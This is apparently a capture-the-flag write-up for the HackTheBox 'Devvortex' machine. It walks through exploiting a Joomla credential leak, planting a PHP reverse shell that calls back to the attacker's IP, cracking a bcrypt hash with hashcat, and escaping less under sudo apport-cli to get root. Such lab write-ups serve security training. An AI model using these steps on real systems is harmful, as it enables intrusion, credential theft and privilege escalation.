---
title: "HackTheBox - Devvortex"
date: 2024-04-27T10:42:02-05:00
tags: ["Joomla","Webshell","MySQL","hashcat","less"]
description: "Devvortex is an easy difficulty box, with an exposed private subdomain. The subdomain is utilizing a vulnerable version of Joomla, which we can use to view login credentials. As an admin of the site, we can edit php pages to a reverse or web shell. With access to the system, we can access all credentials in the mysql database, and crack a user's password. The user has sudo privileges on apport-cli, which uses less as a pager that we can abuse to escape into an interactive shell session as root."
image: "Devvortex.png"
categories: ["Hack The Box"]
---
## Enumeration
initial nmap:
```
Nmap scan report for 10.129.162.96
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
```
We can note that there is a web server open on port 80, utilizing nginx.
There is a redirection to `devvortex.htb`, so we should add this to /etc/hosts:
```
┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ cat /etc/hosts          
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.162.96 devvortex.htb
```
When we fuzz for subdomains, we can find the subdomain `dev.devvortex.htb`
```
┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 502 [Size: 166]
Found: ..devvortex.htb Status: 400 [Size: 166]
Found: .html..devvortex.htb Status: 400 [Size: 166]
Found: .htm..devvortex.htb Status: 400 [Size: 166]
Found: .php..devvortex.htb Status: 400 [Size: 166]
Found: .search..devvortex.htb Status: 400 [Size: 166]
Found: .aspx..devvortex.htb Status: 400 [Size: 166]
Found: .pdf..devvortex.htb Status: 400 [Size: 166]
Progress: 27983 / 56294 (49.71%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 28083 / 56294 (49.89%)
===============================================================
Finished
===============================================================
```
Using the raft wordlist was a bit of a poor choice, as it was producting quite a few false positives with words beginning with a dot.
### Enumerating dev subdomain
With basic enumeration, we can find interesting information in a `robots.txt` file. Robots.txt is used to tell automated web crawlers which subdomains are off-limits. This can help private data from being found in google searches, but it also gives us a good idea on what areas can contain sensitive information.
![](images/robotstxt.png)

We can also glean some very important information from the standard format of this robots.txt as well: the server is running Joomla, as indicated by the standard commented information. We can learn more about the joomla version by checking the README, also conveniently located in the root folder:

![](images/joomla.png)

We can read here that the version appears to be 4.2.x, as the latest changelog mentions such. When we search for joomla vulnerabilities, we find [an information disclosure CVE](https://www.exploit-db.com/exploits/51334) that might be relevant.
### Unauthorized access to credentials via vulnerable Joomla version
The exploit script did not work for me, but we can see from the code that it fetches information from an exposed api endpoint:
`/api/index.php/v1/config/application?public=true`
We can visit this page manually, and find a username and password within:

![](images/api.png)

`lewis:P4ntherg0t1n5r3c0n##`

With these credentials, we can login to the Joomla Administrator Login page by visiting `http://dev.devvortex.htb/administrator/`:

![](images/admin.png)

### Creating a php reverse shell by editing templates
The administrator is able to edit php templates via System > Site Templates, and with this I can upload a php reverse shell. Getting php shell:
```
┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
```
We need to edit the IP address and port of our php file:
```
┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ head php-reverse-shell.php                                           
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.102';  // CHANGE THIS
$port = 8000;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
```
Replacing error.php:

![](images/errorphp.png)

Set up nc listener:
```
┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ nc -nvlp 8000
listening on [any] 8000 ...
```

And now, when we visit the error template page at `http://dev.devvortex.htb/templates/cassiopeia/error.php`, we will catch the reverse shell:
```
┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.14.102] from (UNKNOWN) [10.10.11.242] 56650
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 23:12:26 up  3:36,  1 user,  load average: 3.71, 1.14, 0.44
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
logan    pts/1    10.10.14.203     21:26   50:30   0.49s  0.03s sshd: logan [priv]  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## Lateral Movement
### Reusing credentials to access mysql
We need to improve the stability of the shell; my preferred way is using `script`, although python is common as well:
```
$ script -qc /bin/bash /dev/null
www-data@devvortex:/$ ^Z
zsh: suspended  nc -nvlp 8000

┌──(kali㉿kali)-[~/Documents/Devvortex]
└─$ stty raw -echo; fg 
[1]  + continued  nc -nvlp 8000

www-data@devvortex:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:/$ 
```
`^Z` refers to backgrounding the shell session, where we enter `stty raw -echo; fg` in our kali session.
Using netstat, we can see mysql is running on port 3306:
```
www-data@devvortex:/$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      894/nginx: worker p 
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      894/nginx: worker p 

```
When we try recycling credentials for lewis, we find that we can enter the mysql database!
```
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12678
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
Finding joomla database:
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```
Finding user table:
```
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
<...SNIP...>
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.01 sec)
```
users and user_profiles are most interesting, so we start with them:
```
mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-04-29 23:04:44 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
```
The format is messy, but with this we can see a hash for another user Logan Paul. We can check home folders and see that logan is a user on this system:
```
www-data@devvortex:/$ ls /home
logan
```
Using `hashid` we can see that this is blowfish/bcrypt encryption:
```
┌──(kali㉿kali)-[~]
└─$ hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```
We can crack this hash using  `hashcat`:
```
$ hashcat -m 3200 '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

Successfully initialized NVIDIA CUDA library.
<...SNIP...>
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sun Nov 26 01:14:03 2023 (7 secs)
Time.Estimated...: Sun Nov 26 01:14:10 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      187 H/s (7.49ms) @ Accel:16 Loops:8 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1408/14344384 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1232/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: pedro -> tagged
Hardware.Mon.#1..: Temp: 64c Fan: 29% Util: 99% Core:1316MHz Mem:3505MHz Bus:16

Started: Sun Nov 26 01:14:02 2023
Stopped: Sun Nov 26 01:14:11 2023
```
We now have a new pair of credentials as `logan:tequieromucho`. We can use this to ssh directly into the machine:
```
┌──(kali㉿kali)-[~]
└─$ ssh logan@devvortex.htb
The authenticity of host 'devvortex.htb (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
<...SNIP...>
logan@devvortex:~$ 
```
## Privilege Escalation
### Using file viewer 'less' to retain a privileged shell session
Checking sudo privileges:
```
logan@devvortex:/tmp$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
We can get more information from the tool by checking the man page:
```
DESCRIPTION
       apport  automatically  collects  data  from  crashed processes and compiles a problem report in /var/crash/. This is a command line frontend for reporting those crashes to the developers. It can also be used to report bugs
       about packages or running processes.

       If symptom scripts are available, it can also be given the name of a symptom, or be called with just -f to display a list of known symptoms.

       When being called without any options, it processes the pending crash reports and offers to report them one by one. You can also display the entire report to see what is sent to the software developers.

       When being called with exactly one argument and no option, apport-cli uses some heuristics to find out "what you mean" and reports a bug against the given symptom name, package name, program path, or PID. If  the  argument
       is a .crash or .apport file, it uploads the stored problem report to the bug tracking system.

       For  desktop systems with a graphical user interface, you should consider installing the GTK or KDE user interface (apport-gtk or apport-kde). They accept the very same options and arguments.  apport-cli is mainly intended
       to be used on servers.
```
It is a crash viewer/reporter tool. My thinking is if we can find a way to view a file through apport-cli, it will likely be displayed using `more` or `less`, both of which have easy ways to "escape" into an interactive shell where we retain our root privileges. After some tinkering, I found a way to create a crash event using `apport-cli`:
```
logan@devvortex:/tmp$ sudo /usr/bin/apport-cli -w

*** 

After closing this message please click on an application window to report a problem about it.

Press any key to continue... 

Traceback (most recent call last):
  File "/usr/bin/apport-cli", line 387, in <module>
    if not app.run_argv():
  File "/usr/lib/python3/dist-packages/apport/ui.py", line 770, in run_argv
    xprop = subprocess.Popen(['xprop', '_NET_WM_PID'],
  File "/usr/lib/python3.8/subprocess.py", line 858, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.8/subprocess.py", line 1704, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'xprop'
```
Following the crash event, we are given the option to view the report:
```
logan@devvortex:/tmp$ sudo /usr/bin/apport-cli

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (30.2 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): 
```
Selecting View does some preparation, before we are dropped in a viewer software, which I believe to be `less`. We can invoke an interactive shell by typing `!/bin/bash`:
```
 ---------------------------------------------------------------------------

                          SEARCHING

  /pattern          *  Search forward for (N-th) matching line.
  ?pattern          *  Search backward for (N-th) matching line.
  n                 *  Repeat previous search (for N-th occurrence).
  N                 *  Repeat previous search in reverse direction.
  ESC-n             *  Repeat previous search, spanning files.
  ESC-N             *  Repeat previous search, reverse dir. & spanning files.
  ESC-u                Undo (toggle) search highlighting.
  &pattern          *  Display only matching lines
        ---------------------------------------------------
        A search pattern may begin with one or more of:
        ^N or !  Search for NON-matching lines.
        ^E or *  Search multiple files (pass thru END OF FILE).
        ^F or @  Start search at FIRST file (for /) or last file (for ?).
        ^K       Highlight matches, but don't move (KEEP position).
        ^R       Don't use REGULAR EXPRESSIONS.
 ---------------------------------------------------------------------------
!/bin/bash
```
After hitting the return key, we now have a bash sesison as the user `root`:
```
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
```
